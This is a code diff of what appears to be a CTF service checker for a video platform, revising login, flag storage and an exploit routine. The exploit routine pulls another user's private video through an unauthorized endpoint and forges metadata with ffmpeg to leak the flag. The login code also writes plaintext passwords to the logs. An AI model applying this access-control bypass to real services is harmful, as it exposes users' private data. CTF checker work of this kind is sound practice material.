@@ -7,6 +7,7 @@ import os
 from httpx import AsyncClient, Response
 from names import adjectives, content_types, cities, countries
 import ffmpeg
+from bs4 import BeautifulSoup
 
 
 from typing import Optional
@@ -58,13 +59,14 @@ async def signup(client: AsyncClient, username: str, password:str, logger):
         raise MumbleException(f"Failed to sign up user, status_code: {status_code}")
 
 async def login(client: AsyncClient, username:str, password: str, logger):
-    logger.info(f"Starting login process for user: {username}")
+    logger.info(f"Starting login process for user: {username} and password {password}")
     login_data = {"username": username,
                    "password": password}
-    response = await client.post("/checkcredentials", login_data)
+    response = await client.post("/checkcredentials", data=login_data)
+    logger.info(f"Response of /checkcredentials with status: {response.status_code} and with content {response.text}")
     status_code = response.status_code
     if status_code in [303]:
-        logger.info(f"Successfull login of user {username} with redirection {status_code}")
+        logger.info(f"Successfull login of user {username} with redirection {status_code} ")
     else:
         logger.error(f"Failed Login of user {username} should be Unauthozired {status_code}")
         raise MumbleException(f"Failed Login of user {username} should be Unauthozired {status_code}")
@@ -105,22 +107,25 @@ def get_random_thumbnail_path(path="thumbnails") -> str:
     return os.path.join(path, random.choice(thumbnails))
     
 
-def create_video_with_metadata(creator, location, title,logger, is_exploit=False):
+def create_video_with_metadata(creator: str, location, title,logger, is_exploit=False):
     """change metadata of video so it can be exploited later with ffmpeg"""
     if is_exploit:
         path = 'exploit.mp4'
     else:
         path = 'metadata_video.mp4'
-    logger.info(f"Changing the metadata of the Video {title} with location {location} from creator {creator} saved at {path}")
     video_path = get_random_video_path()
+    
+    logger.info(f"Changing the metadata of the Video {title} with location {location} from creator {creator} saved at {path}, from the video \n {video_path}")
+    
     ffmpeg.input(video_path).output(
     path,
     **{
-        'metadata:title': title,
-        'metadata:creator': creator,
-        'metadata:location': location
+        'metadata': f'title={title}',
+        'metadata:': f'location={location}',
+        'metadata': f'creator={creator}'
     }
-).overwrite_output().run()
+    ).overwrite_output().run()
+    logger.info("Metdata_video build successfully")
   
     
 
@@ -135,13 +140,18 @@ async def upload_private_video(client: AsyncClient, description, location, title
    multiform_data = {
         "name": (None,title),
         "description": (None,description),
-        "location": (None,location),
+        "is_private": (None,"1"),
+        
+        "file": ("video", open(path,"rb"), "video/mp4"),
         "thumbnail": ("thumbnail", open(get_random_thumbnail_path(),"rb"), "image/png"),
-        "file": ("video", path, "video/mp4"),
-        "is_private": (None,1)
+        "location": (None,location)
+        
     }
-   response = await client.post("create_video", files=multiform_data)
+   logger.info("POST to create_video")
+   response = await client.post("/app/create_video", files=multiform_data)
    status_code = response.status_code
+   if status_code == 404:
+        logger.info(f"Client error {status_code} with {response.text}")
    
    if status_code in [303]:
        logger.info(f"Video was succesfully uploaded")
@@ -171,14 +181,14 @@ async def putflag_note(
 
     logger.debug(f"Connecting to service")
     # Register a new user
-    await client.signup(username, password)
+    await signup(client,username, password,logger)
     # Login
-    await client.login(username, password)
+    await login(client, username, password,logger)
     
     #Create Data for video
     title = generate_title()
     location = generate_location()
-    description: str  = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    description: str  = task.flag
     logger.debug(f"Creating video with right metadata for exploit")
     create_video_with_metadata(creator=username, location=location, title=title,logger=logger)
     logger.debug(f"Saving flag")
@@ -186,7 +196,7 @@ async def putflag_note(
     
 
     #save flag and userdata
-    await db.set("userdata", (username, password, url, description))
+    await db.set("userdata", (username, password, url, title))
 
     return username
 
@@ -195,13 +205,15 @@ async def getflag_note(
     task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient
 ) -> None:
     try:
-        username, password, url, description = await db.get("userdata")
+        username, password, url, title = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
 
-    await login(client, username, password)
+    logger.debug(f"getflag(0) for the user {username} and video {title}")
+    await login(client, username, password,logger)
 
-    response = await client.get(url)
+    logger.info(f"try to access flag in /app/myprofile")
+    response = await client.get("/get_my_videos")
     logger.debug(response.text)
     assert_in(task.flag, response.text, "Flag missing")
         
@@ -227,8 +239,9 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     if response.status_code != 200:
         raise MumbleException()
     json = response.json()
+    logger.info(f"json is {json}")
     id = json.get("id")
-    private_video_response.raise_for_status()
+    logger.info(f"/get_private_videos/{id}")
     private_video_response = await client.get(f"/get_private_videos/{id}")
     videos = private_video_response.json()
     video = videos[0]
@@ -236,17 +249,20 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     location = video.get("location")
     
     create_video_with_metadata(username, location, title,logger, is_exploit=True)
-    upload_private_video(client, "ist egal", "Berlin", title,logger, True)
+    await upload_private_video(client, "ist egal", "Berlin", title,logger, True)
     
     my_vid_response = await client.get("/get_my_videos")
     if my_vid_response.status_code != 200:
         raise MumbleException()
     videos = my_vid_response.json()
+    logger.info(f"Videos are {videos}")
     for video in videos:
-        if video.name == title:
-            video_path = video.path
+        logger.info(f"video {video}")
+        if video.get("name") == title:
+            video_path = video.get("path")
             break
     
+    logger.info(f"/get_video_info/{video_path}")
     video_response = await client.get(f"/get_video_info/{video_path}")
     if video_response.status_code != 200:
         raise MumbleException()
